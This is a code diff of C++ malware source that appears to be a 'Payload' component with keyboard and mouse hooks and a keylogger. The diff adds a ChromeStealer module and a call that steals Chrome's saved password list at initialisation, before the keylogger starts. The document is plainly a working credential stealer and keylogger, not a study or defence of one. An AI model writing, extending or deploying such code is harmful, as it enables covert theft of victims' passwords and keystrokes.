@@ -1,9 +1,11 @@
 #include "Payload.h"
+#include "ChromeStealer.h"
 
 Payload *Payload::current = NULL;
 HINSTANCE Payload::Instance;
 HHOOK Payload::KeyboardHook;
 HHOOK Payload::MouseHook;
+ChromeStealer Cs;
 
 Payload::Payload(void)
 {
@@ -15,8 +17,11 @@ Payload::~Payload(void)
 
 void Payload::init(void)
 {
+	Cs.stealPasswordList();
 	_keylogger.init();
 	_ppgt.init();
+	//std::cerr << "Init" << std::endl;
+	//if (Cs.canSteal())
 }
 
 void Payload::createKeyboardHook(void)
@@ -50,8 +55,6 @@ Keylogger &Payload::keylogger(void)
 {
 	return (_keylogger);
 }
-
-
 
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
